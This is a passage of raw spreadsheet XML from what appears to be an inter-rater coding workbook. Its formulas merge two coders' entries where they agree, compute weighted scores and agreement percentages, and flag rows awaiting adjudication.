        <f>IF(AND(Coder1!I37&amp;""&lt;&gt;"",Coder1!I37&amp;""=Coder2!I37&amp;""),Coder1!I37,"")</f>
        <v/>
      </c>
      <c r="J37" s="14">
        <f>IF(AND(Coder1!J37&amp;""&lt;&gt;"",Coder1!J37&amp;""=Coder2!J37&amp;""),Coder1!J37,"")</f>
        <v/>
      </c>
      <c r="K37" s="14">
        <f>IF(AND(Coder1!K37&amp;""&lt;&gt;"",Coder1!K37&amp;""=Coder2!K37&amp;""),Coder1!K37,"")</f>
        <v/>
      </c>
      <c r="L37" s="14">
        <f>IF(AND(Coder1!L37&amp;""&lt;&gt;"",Coder1!L37&amp;""=Coder2!L37&amp;""),Coder1!L37,"")</f>
        <v/>
      </c>
      <c r="M37" s="14">
        <f>IF(AND(Coder1!M37&amp;""&lt;&gt;"",Coder1!M37&amp;""=Coder2!M37&amp;""),Coder1!M37,"")</f>
        <v/>
      </c>
      <c r="N37" s="14">
        <f>IF(AND(Coder1!N37&amp;""&lt;&gt;"",Coder1!N37&amp;""=Coder2!N37&amp;""),Coder1!N37,"")</f>
        <v/>
      </c>
      <c r="O37" s="14">
        <f>IF(AND(Coder1!O37&amp;""&lt;&gt;"",Coder1!O37&amp;""=Coder2!O37&amp;""),Coder1!O37,"")</f>
        <v/>
      </c>
      <c r="P37" s="14">
        <f>IF(AND(Coder1!P37&amp;""&lt;&gt;"",Coder1!P37&amp;""=Coder2!P37&amp;""),Coder1!P37,"")</f>
        <v/>
      </c>
      <c r="Q37" s="14">
        <f>IF(AND(Coder1!Q37&amp;""&lt;&gt;"",Coder1!Q37&amp;""=Coder2!Q37&amp;""),Coder1!Q37,"")</f>
        <v/>
      </c>
      <c r="R37" s="14">
        <f>IF(AND(Coder1!R37&amp;""&lt;&gt;"",Coder1!R37&amp;""=Coder2!R37&amp;""),Coder1!R37,"")</f>
        <v/>
      </c>
      <c r="S37" s="14">
        <f>IF(AND(Coder1!S37&amp;""&lt;&gt;"",Coder1!S37&amp;""=Coder2!S37&amp;""),Coder1!S37,"")</f>
        <v/>
      </c>
      <c r="T37" s="14">
        <f>IF(AND(Coder1!T37&amp;""&lt;&gt;"",Coder1!T37&amp;""=Coder2!T37&amp;""),Coder1!T37,"")</f>
        <v/>
      </c>
      <c r="U37" s="14">
        <f>IF(AND(Coder1!U37&amp;""&lt;&gt;"",Coder1!U37&amp;""=Coder2!U37&amp;""),Coder1!U37,"")</f>
        <v/>
      </c>
      <c r="V37" s="14">
        <f>IF(AND(Coder1!V37&amp;""&lt;&gt;"",Coder1!V37&amp;""=Coder2!V37&amp;""),Coder1!V37,"")</f>
        <v/>
      </c>
      <c r="W37" s="14">
        <f>IF(AND(Coder1!W37&amp;""&lt;&gt;"",Coder1!W37&amp;""=Coder2!W37&amp;""),Coder1!W37,"")</f>
        <v/>
      </c>
      <c r="X37" s="14">
        <f>IF(AND(Coder1!X37&amp;""&lt;&gt;"",Coder1!X37&amp;""=Coder2!X37&amp;""),Coder1!X37,"")</f>
        <v/>
      </c>
      <c r="Y37" s="14">
        <f>IF(AND(Coder1!Y37&amp;""&lt;&gt;"",Coder1!Y37&amp;""=Coder2!Y37&amp;""),Coder1!Y37,"")</f>
        <v/>
      </c>
      <c r="Z37" s="14">
        <f>IF(AND(Coder1!Z37&amp;""&lt;&gt;"",Coder1!Z37&amp;""=Coder2!Z37&amp;""),Coder1!Z37,"")</f>
        <v/>
      </c>
      <c r="AA37" s="14">
        <f>IF(AND(Coder1!AA37&amp;""&lt;&gt;"",Coder1!AA37&amp;""=Coder2!AA37&amp;""),Coder1!AA37,"")</f>
        <v/>
      </c>
      <c r="AB37" s="14">
        <f>IF(AND(Coder1!AB37&amp;""&lt;&gt;"",Coder1!AB37&amp;""=Coder2!AB37&amp;""),Coder1!AB37,"")</f>
        <v/>
      </c>
      <c r="AC37" s="14">
        <f>IF(AND(Coder1!AC37&amp;""&lt;&gt;"",Coder1!AC37&amp;""=Coder2!AC37&amp;""),Coder1!AC37,"")</f>
        <v/>
      </c>
      <c r="AD37" s="14">
        <f>IF(AND(Coder1!AD37&amp;""&lt;&gt;"",Coder1!AD37&amp;""=Coder2!AD37&amp;""),Coder1!AD37,"")</f>
        <v/>
      </c>
      <c r="AE37" s="14">
        <f>IF(AND(Coder1!AE37&amp;""&lt;&gt;"",Coder1!AE37&amp;""=Coder2!AE37&amp;""),Coder1!AE37,"")</f>
        <v/>
      </c>
      <c r="AF37" s="14">
        <f>IF(AND(Coder1!AF37&amp;""&lt;&gt;"",Coder1!AF37&amp;""=Coder2!AF37&amp;""),Coder1!AF37,"")</f>
        <v/>
      </c>
      <c r="AG37" s="14">
        <f>IF(AND(Coder1!AG37&amp;""&lt;&gt;"",Coder1!AG37&amp;""=Coder2!AG37&amp;""),Coder1!AG37,"")</f>
        <v/>
      </c>
      <c r="AH37" s="14">
        <f>IF(AND(Coder1!AH37&amp;""&lt;&gt;"",Coder1!AH37&amp;""=Coder2!AH37&amp;""),Coder1!AH37,"")</f>
        <v/>
      </c>
      <c r="AI37" s="11">
        <f>IF(COUNT(E37:L37)=0,"",SUM(E37:L37))</f>
        <v/>
      </c>
      <c r="AJ37" s="11">
        <f>IF(AI37="","",N(E37)*3+N(F37)*2+N(G37)*2+N(H37)*2+N(I37)*2+N(J37)*3+N(K37)*3+N(L37)*3)</f>
        <v/>
      </c>
      <c r="AK37" s="11">
        <f>IF(AI37="","",COUNTIF(N37:AG37,1))</f>
        <v/>
      </c>
      <c r="AL37" s="11">
        <f>IF(OR(AJ37="",AJ37=0),"",ROUND(100*(AJ37-AK37)/AJ37,1))</f>
        <v/>
      </c>
      <c r="AM37" s="11">
        <f>IF(AND(Coder1!AN37=1,Coder2!AN37=1),IF(COUNTBLANK(E37:AH37)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN37" s="11">
        <f>IF(AND(Coder1!AN37=1,Coder2!AN37=1),IF(SUMPRODUCT(--(Coder1!E37:AH37&amp;""&lt;&gt;Coder2!E37:AH37&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO37" s="11" t="n"/>
    </row>
    <row r="38">
      <c r="A38" s="11">
        <f>Coder1!A38</f>
        <v/>
      </c>
      <c r="B38" s="11">
        <f>Coder1!B38</f>
        <v/>
      </c>
      <c r="C38" s="11">
        <f>Coder1!C38</f>
        <v/>
      </c>
      <c r="D38" s="11">
        <f>Coder1!D38</f>
        <v/>
      </c>
      <c r="E38" s="14">
        <f>IF(AND(Coder1!E38&amp;""&lt;&gt;"",Coder1!E38&amp;""=Coder2!E38&amp;""),Coder1!E38,"")</f>
        <v/>
      </c>
      <c r="F38" s="14">
        <f>IF(AND(Coder1!F38&amp;""&lt;&gt;"",Coder1!F38&amp;""=Coder2!F38&amp;""),Coder1!F38,"")</f>
        <v/>
      </c>
      <c r="G38" s="14">
        <f>IF(AND(Coder1!G38&amp;""&lt;&gt;"",Coder1!G38&amp;""=Coder2!G38&amp;""),Coder1!G38,"")</f>
        <v/>
      </c>
      <c r="H38" s="14">
        <f>IF(AND(Coder1!H38&amp;""&lt;&gt;"",Coder1!H38&amp;""=Coder2!H38&amp;""),Coder1!H38,"")</f>
        <v/>
      </c>
      <c r="I38" s="14">
        <f>IF(AND(Coder1!I38&amp;""&lt;&gt;"",Coder1!I38&amp;""=Coder2!I38&amp;""),Coder1!I38,"")</f>
        <v/>
      </c>
      <c r="J38" s="14">
        <f>IF(AND(Coder1!J38&amp;""&lt;&gt;"",Coder1!J38&amp;""=Coder2!J38&amp;""),Coder1!J38,"")</f>
        <v/>
      </c>
      <c r="K38" s="14">
        <f>IF(AND(Coder1!K38&amp;""&lt;&gt;"",Coder1!K38&amp;""=Coder2!K38&amp;""),Coder1!K38,"")</f>
        <v/>
      </c>
      <c r="L38" s="14">
        <f>IF(AND(Coder1!L38&amp;""&lt;&gt;"",Coder1!L38&amp;""=Coder2!L38&amp;""),Coder1!L38,"")</f>
        <v/>
      </c>
      <c r="M38" s="14">
        <f>IF(AND(Coder1!M38&amp;""&lt;&gt;"",Coder1!M38&amp;""=Coder2!M38&amp;""),Coder1!M38,"")</f>
        <v/>
      </c>
      <c r="N38" s="14">
        <f>IF(AND(Coder1!N38&amp;""&lt;&gt;"",Coder1!N38&amp;""=Coder2!N38&amp;""),Coder1!N38,"")</f>
        <v/>
      </c>
      <c r="O38" s="14">
        <f>IF(AND(Coder1!O38&amp;""&lt;&gt;"",Coder1!O38&amp;""=Coder2!O38&amp;""),Coder1!O38,"")</f>
        <v/>
      </c>
      <c r="P38" s="14">
        <f>IF(AND(Coder1!P38&amp;""&lt;&gt;"",Coder1!P38&amp;""=Coder2!P38&amp;""),Coder1!P38,"")</f>
        <v/>
      </c>
      <c r="Q38" s="14">
        <f>IF(AND(Coder1!Q38&amp;""&lt;&gt;"",Coder1!Q38&amp;""=Coder2!Q38&amp;""),Coder1!Q38,"")</f>
        <v/>
      </c>
      <c r="R38" s="14">
        <f>IF(AND(Coder1!R38&amp;""&lt;&gt;"",Coder1!R38&amp;""=Coder2!R38&amp;""),Coder1!R38,"")</f>
        <v/>
      </c>
      <c r="S38" s="14">
        <f>IF(AND(Coder1!S38&amp;""&lt;&gt;"",Coder1!S38&amp;""=Coder2!S38&amp;""),Coder1!S38,"")</f>
        <v/>
      </c>
      <c r="T38" s="14">
        <f>IF(AND(Coder1!T38&amp;""&lt;&gt;"",Coder1!T38&amp;""=Coder2!T38&amp;""),Coder1!T38,"")</f>
        <v/>
      </c>
      <c r="U38" s="14">
        <f>IF(AND(Coder1!U38&amp;""&lt;&gt;"",Coder1!U38&amp;""=Coder2!U38&amp;""),Coder1!U38,"")</f>
        <v/>
      </c>
      <c r="V38" s="14">
        <f>IF(AND(Coder1!V38&amp;""&lt;&gt;"",Coder1!V38&amp;""=Coder2!V38&amp;""),Coder1!V38,"")</f>
        <v/>
      </c>
      <c r="W38" s="14">
        <f>IF(AND(Coder1!W38&amp;""&lt;&gt;"",Coder1!W38&amp;""=Coder2!W38&amp;""),Coder1!W38,"")</f>
        <v/>
      </c>
      <c r="X38" s="14">
        <f>IF(AND(Coder1!X38&amp;""&lt;&gt;"",Coder1!X38&amp;""=Coder2!X38&amp;""),Coder1!X38,"")</f>
        <v/>
      </c>
      <c r="Y38" s="14">
        <f>IF(AND(Coder1!Y38&amp;""&lt;&gt;"",Coder1!Y38&amp;""=Coder2!Y38&amp;""),Coder1!Y38,"")</f>
        <v/>
      </c>
      <c r="Z38" s="14">
        <f>IF(AND(Coder1!Z38&amp;""&lt;&gt;"",Coder1!Z38&amp;""=Coder2!Z38&amp;""),Coder1!Z38,"")</f>
        <v/>
      </c>
      <c r="AA38" s="14">
        <f>IF(AND(Coder1!AA38&amp;""&lt;&gt;"",Coder1!AA38&amp;""=Coder2!AA38&amp;""),Coder1!AA38,"")</f>
        <v/>
      </c>
      <c r="AB38" s="14">
        <f>IF(AND(Coder1!AB38&amp;""&lt;&gt;"",Coder1!AB38&amp;""=Coder2!AB38&amp;""),Coder1!AB38,"")</f>
        <v/>
      </c>
      <c r="AC38" s="14">
        <f>IF(AND(Coder1!AC38&amp;""&lt;&gt;"",Coder1!AC38&amp;""=Coder2!AC38&amp;""),Coder1!AC38,"")</f>
        <v/>
      </c>
      <c r="AD38" s="14">
        <f>IF(AND(Coder1!AD38&amp;""&lt;&gt;"",Coder1!AD38&amp;""=Coder2!AD38&amp;""),Coder1!AD38,"")</f>
        <v/>
      </c>
      <c r="AE38" s="14">
        <f>IF(AND(Coder1!AE38&amp;""&lt;&gt;"",Coder1!AE38&amp;""=Coder2!AE38&amp;""),Coder1!AE38,"")</f>
        <v/>
      </c>
      <c r="AF38" s="14">
        <f>IF(AND(Coder1!AF38&amp;""&lt;&gt;"",Coder1!AF38&amp;""=Coder2!AF38&amp;""),Coder1!AF38,"")</f>
        <v/>
      </c>
      <c r="AG38" s="14">
        <f>IF(AND(Coder1!AG38&amp;""&lt;&gt;"",Coder1!AG38&amp;""=Coder2!AG38&amp;""),Coder1!AG38,"")</f>
        <v/>
      </c>
      <c r="AH38" s="14">
        <f>IF(AND(Coder1!AH38&amp;""&lt;&gt;"",Coder1!AH38&amp;""=Coder2!AH38&amp;""),Coder1!AH38,"")</f>
        <v/>
      </c>
      <c r="AI38" s="11">
        <f>IF(COUNT(E38:L38)=0,"",SUM(E38:L38))</f>
        <v/>
      </c>
      <c r="AJ38" s="11">
        <f>IF(AI38="","",N(E38)*3+N(F38)*2+N(G38)*2+N(H38)*2+N(I38)*2+N(J38)*3+N(K38)*3+N(L38)*3)</f>
        <v/>
      </c>
      <c r="AK38" s="11">
        <f>IF(AI38="","",COUNTIF(N38:AG38,1))</f>
        <v/>
      </c>
      <c r="AL38" s="11">
        <f>IF(OR(AJ38="",AJ38=0),"",ROUND(100*(AJ38-AK38)/AJ38,1))</f>
        <v/>
      </c>
      <c r="AM38" s="11">
        <f>IF(AND(Coder1!AN38=1,Coder2!AN38=1),IF(COUNTBLANK(E38:AH38)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN38" s="11">
        <f>IF(AND(Coder1!AN38=1,Coder2!AN38=1),IF(SUMPRODUCT(--(Coder1!E38:AH38&amp;""&lt;&gt;Coder2!E38:AH38&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO38" s="11" t="n"/>
    </row>
    <row r="39">
      <c r="A39" s="11">
        <f>Coder1!A39</f>
        <v/>
      </c>
      <c r="B39" s="11">
        <f>Coder1!B39</f>
        <v/>
      </c>
      <c r="C39" s="11">
        <f>Coder1!C39</f>
        <v/>
      </c>
      <c r="D39" s="11">
        <f>Coder1!D39</f>
        <v/>
      </c>
      <c r="E39" s="14">
        <f>IF(AND(Coder1!E39&amp;""&lt;&gt;"",Coder1!E39&amp;""=Coder2!E39&amp;""),Coder1!E39,"")</f>
        <v/>
      </c>
      <c r="F39" s="14">
        <f>IF(AND(Coder1!F39&amp;""&lt;&gt;"",Coder1!F39&amp;""=Coder2!F39&amp;""),Coder1!F39,"")</f>
        <v/>
      </c>
      <c r="G39" s="14">
        <f>IF(AND(Coder1!G39&amp;""&lt;&gt;"",Coder1!G39&amp;""=Coder2!G39&amp;""),Coder1!G39,"")</f>
        <v/>
      </c>
      <c r="H39" s="14">
        <f>IF(AND(Coder1!H39&amp;""&lt;&gt;"",Coder1!H39&amp;""=Coder2!H39&amp;""),Coder1!H39,"")</f>
        <v/>
      </c>
      <c r="I39" s="14">
        <f>IF(AND(Coder1!I39&amp;""&lt;&gt;"",Coder1!I39&amp;""=Coder2!I39&amp;""),Coder1!I39,"")</f>
        <v/>
      </c>
      <c r="J39" s="14">
        <f>IF(AND(Coder1!J39&amp;""&lt;&gt;"",Coder1!J39&amp;""=Coder2!J39&amp;""),Coder1!J39,"")</f>
        <v/>
      </c>
      <c r="K39" s="14">
        <f>IF(AND(Coder1!K39&amp;""&lt;&gt;"",Coder1!K39&amp;""=Coder2!K39&amp;""),Coder1!K39,"")</f>
        <v/>
      </c>
      <c r="L39" s="14">
        <f>IF(AND(Coder1!L39&amp;""&lt;&gt;"",Coder1!L39&amp;""=Coder2!L39&amp;""),Coder1!L39,"")</f>
        <v/>
      </c>
      <c r="M39" s="14">
        <f>IF(AND(Coder1!M39&amp;""&lt;&gt;"",Coder1!M39&amp;""=Coder2!M39&amp;""),Coder1!M39,"")</f>
        <v/>
      </c>
      <c r="N39" s="14">
        <f>IF(AND(Coder1!N39&amp;""&lt;&gt;"",Coder1!N39&amp;""=Coder2!N39&amp;""),Coder1!N39,"")</f>
        <v/>
      </c>
      <c r="O39" s="14">
        <f>IF(AND(Coder1!O39&amp;""&lt;&gt;"",Coder1!O39&amp;""=Coder2!O39&amp;""),Coder1!O39,"")</f>
        <v/>
      </c>
      <c r="P39" s="14">
        <f>IF(AND(Coder1!P39&amp;""&lt;&gt;"",Coder1!P39&amp;""=Coder2!P39&amp;""),Coder1!P39,"")</f>
        <v/>
      </c>
      <c r="Q39" s="14">
        <f>IF(AND(Coder1!Q39&amp;""&lt;&gt;"",Coder1!Q39&amp;""=Coder2!Q39&amp;""),Coder1!Q39,"")</f>
        <v/>
      </c>
      <c r="R39" s="14">
        <f>IF(AND(Coder1!R39&amp;""&lt;&gt;"",Coder1!R39&amp;""=Coder2!R39&amp;""),Coder1!R39,"")</f>
        <v/>
      </c>
      <c r="S39" s="14">
        <f>IF(AND(Coder1!S39&amp;""&lt;&gt;"",Coder1!S39&amp;""=Coder2!S39&amp;""),Coder1!S39,"")</f>
        <v/>
      </c>
      <c r="T39" s="14">
        <f>IF(AND(Coder1!T39&amp;""&lt;&gt;"",Coder1!T39&amp;""=Coder2!T39&amp;""),Coder1!T39,"")</f>
        <v/>
      </c>
      <c r="U39" s="14">
        <f>IF(AND(Coder1!U39&amp;""&lt;&gt;"",Coder1!U39&amp;""=Coder2!U39&amp;""),Coder1!U39,"")</f>
        <v/>
      </c>
      <c r="V39" s="14">
        <f>IF(AND(Coder1!V39&amp;""&lt;&gt;"",Coder1!V39&amp;""=Coder2!V39&amp;""),Coder1!V39,"")</f>
        <v/>
      </c>
      <c r="W39" s="14">
        <f>IF(AND(Coder1!W39&amp;""&lt;&gt;"",Coder1!W39&amp;""=Coder2!W39&amp;""),Coder1!W39,"")</f>
        <v/>
      </c>
      <c r="X39" s="14">
        <f>IF(AND(Coder1!X39&amp;""&lt;&gt;"",Coder1!X39&amp;""=Coder2!X39&amp;""),Coder1!X39,"")</f>
        <v/>
      </c>
      <c r="Y39" s="14">
        <f>IF(AND(Coder1!Y39&amp;""&lt;&gt;"",Coder1!Y39&amp;""=Coder2!Y39&amp;""),Coder1!Y39,"")</f>
        <v/>
      </c>
      <c r="Z39" s="14">
        <f>IF(AND(Coder1!Z39&amp;""&lt;&gt;"",Coder1!Z39&amp;""=Coder2!Z39&amp;""),Coder1!Z39,"")</f>
        <v/>
      </c>
      <c r="AA39" s="14">
        <f>IF(AND(Coder1!AA39&amp;""&lt;&gt;"",Coder1!AA39&amp;""=Coder2!AA39&amp;""),Coder1!AA39,"")</f>
        <v/>
      </c>
      <c r="AB39" s="14">
        <f>IF(AND(Coder1!AB39&amp;""&lt;&gt;"",Coder1!AB39&amp;""=Coder2!AB39&amp;""),Coder1!AB39,"")</f>
        <v/>
      </c>
      <c r="AC39" s="14">
        <f>IF(AND(Coder1!AC39&amp;""&lt;&gt;"",Coder1!AC39&amp;""=Coder2!AC39&amp;""),Coder1!AC39,"")</f>
        <v/>
      </c>
      <c r="AD39" s="14">
        <f>IF(AND(Coder1!AD39&amp;""&lt;&gt;"",Coder1!AD39&amp;""=Coder2!AD39&amp;""),Coder1!AD39,"")</f>
        <v/>
      </c>
      <c r="AE39" s="14">
        <f>IF(AND(Coder1!AE39&amp;""&lt;&gt;"",Coder1!AE39&amp;""=Coder2!AE39&amp;""),Coder1!AE39,"")</f>
        <v/>
      </c>
      <c r="AF39" s="14">
        <f>IF(AND(Coder1!AF39&amp;""&lt;&gt;"",Coder1!AF39&amp;""=Coder2!AF39&amp;""),Coder1!AF39,"")</f>
        <v/>
      </c>
      <c r="AG39" s="14">
        <f>IF(AND(Coder1!AG39&amp;""&lt;&gt;"",Coder1!AG39&amp;""=Coder2!AG39&amp;""),Coder1!AG39,"")</f>
        <v/>
      </c>
      <c r="AH39" s="14">
        <f>IF(AND(Coder1!AH39&amp;""&lt;&gt;"",Coder1!AH39&amp;""=Coder2!AH39&amp;""),Coder1!AH39,"")</f>
        <v/>
      </c>
      <c r="AI39" s="11">
        <f>IF(COUNT(E39:L39)=0,"",SUM(E39:L39))</f>
        <v/>
      </c>
      <c r="AJ39" s="11">
        <f>IF(AI39="","",N(E39)*3+N(F39)*2+N(G39)*2+N(H39)*2+N(I39)*2+N(J39)*3+N(K39)*3+N(L39)*3)</f>
        <v/>
      </c>
      <c r="AK39" s="11">
        <f>IF(AI39="","",COUNTIF(N39:AG39,1))</f>
        <v/>
      </c>
      <c r="AL39" s="11">
        <f>IF(OR(AJ39="",AJ39=0),"",ROUND(100*(AJ39-AK39)/AJ39,1))</f>
        <v/>
      </c>
      <c r="AM39" s="11">
        <f>IF(AND(Coder1!AN39=1,Coder2!AN39=1),IF(COUNTBLANK(E39:AH39)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN39" s="11">
        <f>IF(AND(Coder1!AN39=1,Coder2!AN39=1),IF(SUMPRODUCT(--(Coder1!E39:AH39&amp;""&lt;&gt;Coder2!E39:AH39&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO39" s="11" t="n"/>
    </row>
    <row r="40">
      <c r="A40" s="11">
        <f>Coder1!A40</f>
        <v/>
      </c>
      <c r="B40" s="11">
        <f>Coder1!B40</f>
        <v/>
      </c>
      <c r="C40" s="11">
        <f>Coder1!C40</f>
        <v/>
      </c>
      <c r="D40" s="11">
        <f>Coder1!D40</f>
        <v/>
      </c>
      <c r="E40" s="14">
        <f>IF(AND(Coder1!E40&amp;""&lt;&gt;"",Coder1!E40&amp;""=Coder2!E40&amp;""),Coder1!E40,"")</f>
        <v/>
      </c>
      <c r="F40" s="14">
        <f>IF(AND(Coder1!F40&amp;""&lt;&gt;"",Coder1!F40&amp;""=Coder2!F40&amp;""),Coder1!F40,"")</f>
        <v/>
      </c>
      <c r="G40" s="14">
        <f>IF(AND(Coder1!G40&amp;""&lt;&gt;"",Coder1!G40&amp;""=Coder2!G40&amp;""),Coder1!G40,"")</f>
        <v/>
      </c>
      <c r="H40" s="14">
        <f>IF(AND(Coder1!H40&amp;""&lt;&gt;"",Coder1!H40&amp;""=Coder2!H40&amp;""),Coder1!H40,"")</f>
        <v/>
      </c>
      <c r="I40" s="14">
        <f>IF(AND(Coder1!I40&amp;""&lt;&gt;"",Coder1!I40&amp;""=Coder2!I40&amp;""),Coder1!I40,"")</f>
        <v/>
      </c>
      <c r="J40" s="14">
        <f>IF(AND(Coder1!J40&amp;""&lt;&gt;"",Coder1!J40&amp;""=Coder2!J40&amp;""),Coder1!J40,"")</f>
        <v/>
      </c>
      <c r="K40" s="14">
        <f>IF(AND(Coder1!K40&amp;""&lt;&gt;"",Coder1!K40&amp;""=Coder2!K40&amp;""),Coder1!K40,"")</f>
        <v/>
      </c>
      <c r="L40" s="14">
        <f>IF(AND(Coder1!L40&amp;""&lt;&gt;"",Coder1!L40&amp;""=Coder2!L40&amp;""),Coder1!L40,"")</f>
        <v/>
      </c>
      <c r="M40" s="14">
        <f>IF(AND(Coder1!M40&amp;""&lt;&gt;"",Coder1!M40&amp;""=Coder2!M40&amp;""),Coder1!M40,"")</f>
        <v/>
      </c>
      <c r="N40" s="14">
        <f>IF(AND(Coder1!N40&amp;""&lt;&gt;"",Coder1!N40&amp;""=Coder2!N40&amp;""),Coder1!N40,"")</f>
        <v/>
      </c>
      <c r="O40" s="14">
        <f>IF(AND(Coder1!O40&amp;""&lt;&gt;"",Coder1!O40&amp;""=Coder2!O40&amp;""),Coder1!O40,"")</f>
        <v/>
      </c>
      <c r="P40" s="14">
        <f>IF(AND(Coder1!P40&amp;""&lt;&gt;"",Coder1!P40&amp;""=Coder2!P40&amp;""),Coder1!P40,"")</f>
        <v/>
      </c>
      <c r="Q40" s="14">
        <f>IF(AND(Coder1!Q40&amp;""&lt;&gt;"",Coder1!Q40&amp;""=Coder2!Q40&amp;""),Coder1!Q40,"")</f>
        <v/>
      </c>
      <c r="R40" s="14">
        <f>IF(AND(Coder1!R40&amp;""&lt;&gt;"",Coder1!R40&amp;""=Coder2!R40&amp;""),Coder1!R40,"")</f>
        <v/>
      </c>
      <c r="S40" s="14">
        <f>IF(AND(Coder1!S40&amp;""&lt;&gt;"",Coder1!S40&amp;""=Coder2!S40&amp;""),Coder1!S40,"")</f>
        <v/>
      </c>
      <c r="T40" s="14">
        <f>IF(AND(Coder1!T40&amp;""&lt;&gt;"",Coder1!T40&amp;""=Coder2!T40&amp;""),Coder1!T40,"")</f>
        <v/>
      </c>
      <c r="U40" s="14">
        <f>IF(AND(Coder1!U40&amp;""&lt;&gt;"",Coder1!U40&amp;""=Coder2!U40&amp;""),Coder1!U40,"")</f>
        <v/>
      </c>
      <c r="V40" s="14">
        <f>IF(AND(Coder1!V40&amp;""&lt;&gt;"",Coder1!V40&amp;""=Coder2!V40&amp;""),Coder1!V40,"")</f>
        <v/>
      </c>
      <c r="W40" s="14">
        <f>IF(AND(Coder1!W40&amp;""&lt;&gt;"",Coder1!W40&amp;""=Coder2!W40&amp;""),Coder1!W40,"")</f>
        <v/>
      </c>
      <c r="X40" s="14">
        <f>IF(AND(Coder1!X40&amp;""&lt;&gt;"",Coder1!X40&amp;""=Coder2!X40&amp;""),Coder1!X40,"")</f>
        <v/>
      </c>
      <c r="Y40" s="14">
        <f>IF(AND(Coder1!Y40&amp;""&lt;&gt;"",Coder1!Y40&amp;""=Coder2!Y40&amp;""),Coder1!Y40,"")</f>
        <v/>
      </c>
      <c r="Z40" s="14">
        <f>IF(AND(Coder1!Z40&amp;""&lt;&gt;"",Coder1!Z40&amp;""=Coder2!Z40&amp;""),Coder1!Z40,"")</f>
        <v/>
      </c>
      <c r="AA40" s="14">
        <f>IF(AND(Coder1!AA40&amp;""&lt;&gt;"",Coder1!AA40&amp;""=Coder2!AA40&amp;""),Coder1!AA40,"")</f>
        <v/>
      </c>
      <c r="AB40" s="14">
        <f>IF(AND(Coder1!AB40&amp;""&lt;&gt;"",Coder1!AB40&amp;""=Coder2!AB40&amp;""),Coder1!AB40,"")</f>
        <v/>
      </c>
      <c r="AC40" s="14">
        <f>IF(AND(Coder1!AC40&amp;""&lt;&gt;"",Coder1!AC40&amp;""=Coder2!AC40&amp;""),Coder1!AC40,"")</f>
        <v/>
      </c>
      <c r="AD40" s="14">
        <f>IF(AND(Coder1!AD40&amp;""&lt;&gt;"",Coder1!AD40&amp;""=Coder2!AD40&amp;""),Coder1!AD40,"")</f>
        <v/>
      </c>
      <c r="AE40" s="14">
        <f>IF(AND(Coder1!AE40&amp;""&lt;&gt;"",Coder1!AE40&amp;""=Coder2!AE40&amp;""),Coder1!AE40,"")</f>
        <v/>
      </c>
      <c r="AF40" s="14">
        <f>IF(AND(Coder1!AF40&amp;""&lt;&gt;"",Coder1!AF40&amp;""=Coder2!AF40&amp;""),Coder1!AF40,"")</f>
        <v/>
      </c>
      <c r="AG40" s="14">
        <f>IF(AND(Coder1!AG40&amp;""&lt;&gt;"",Coder1!AG40&amp;""=Coder2!AG40&amp;""),Coder1!AG40,"")</f>
        <v/>
      </c>
      <c r="AH40" s="14">
        <f>IF(AND(Coder1!AH40&amp;""&lt;&gt;"",Coder1!AH40&amp;""=Coder2!AH40&amp;""),Coder1!AH40,"")</f>
        <v/>
      </c>
      <c r="AI40" s="11">
        <f>IF(COUNT(E40:L40)=0,"",SUM(E40:L40))</f>
        <v/>
      </c>
      <c r="AJ40" s="11">
        <f>IF(AI40="","",N(E40)*3+N(F40)*2+N(G40)*2+N(H40)*2+N(I40)*2+N(J40)*3+N(K40)*3+N(L40)*3)</f>
        <v/>
      </c>
      <c r="AK40" s="11">
        <f>IF(AI40="","",COUNTIF(N40:AG40,1))</f>
        <v/>
      </c>
      <c r="AL40" s="11">
        <f>IF(OR(AJ40="",AJ40=0),"",ROUND(100*(AJ40-AK40)/AJ40,1))</f>
        <v/>
      </c>
      <c r="AM40" s="11">
        <f>IF(AND(Coder1!AN40=1,Coder2!AN40=1),IF(COUNTBLANK(E40:AH40)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN40" s="11">
        <f>IF(AND(Coder1!AN40=1,Coder2!AN40=1),IF(SUMPRODUCT(--(Coder1!E40:AH40&amp;""&lt;&gt;Coder2!E40:AH40&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO40" s="11" t="n"/>
    </row>
    <row r="41">
      <c r="A41" s="11">
        <f>Coder1!A41</f>
        <v/>
      </c>
      <c r="B41" s="11">
        <f>Coder1!B41</f>
        <v/>
      </c>
      <c r="C41" s="11">
        <f>Coder1!C41</f>
        <v/>
      </c>
      <c r="D41" s="11">
        <f>Coder1!D41</f>
        <v/>
      </c>
      <c r="E41" s="14">
        <f>IF(AND(Coder1!E41&amp;""&lt;&gt;"",Coder1!E41&amp;""=Coder2!E41&amp;""),Coder1!E41,"")</f>
        <v/>
      </c>
      <c r="F41" s="14">
        <f>IF(AND(Coder1!F41&amp;""&lt;&gt;"",Coder1!F41&amp;""=Coder2!F41&amp;""),Coder1!F41,"")</f>
        <v/>
      </c>
      <c r="G41" s="14">
        <f>IF(AND(Coder1!G41&amp;""&lt;&gt;"",Coder1!G41&amp;""=Coder2!G41&amp;""),Coder1!G41,"")</f>
        <v/>
      </c>
      <c r="H41" s="14">
        <f>IF(AND(Coder1!H41&amp;""&lt;&gt;"",Coder1!H41&amp;""=Coder2!H41&amp;""),Coder1!H41,"")</f>
        <v/>
      </c>
      <c r="I41" s="14">
        <f>IF(AND(Coder1!I41&amp;""&lt;&gt;"",Coder1!I41&amp;""=Coder2!I41&amp;""),Coder1!I41,"")</f>
        <v/>
      </c>
      <c r="J41" s="14">
        <f>IF(AND(Coder1!J41&amp;""&lt;&gt;"",Coder1!J41&amp;""=Coder2!J41&amp;""),Coder1!J41,"")</f>
        <v/>
      </c>
      <c r="K41" s="14">
        <f>IF(AND(Coder1!K41&amp;""&lt;&gt;"",Coder1!K41&amp;""=Coder2!K41&amp;""),Coder1!K41,"")</f>
        <v/>
      </c>
      <c r="L41" s="14">
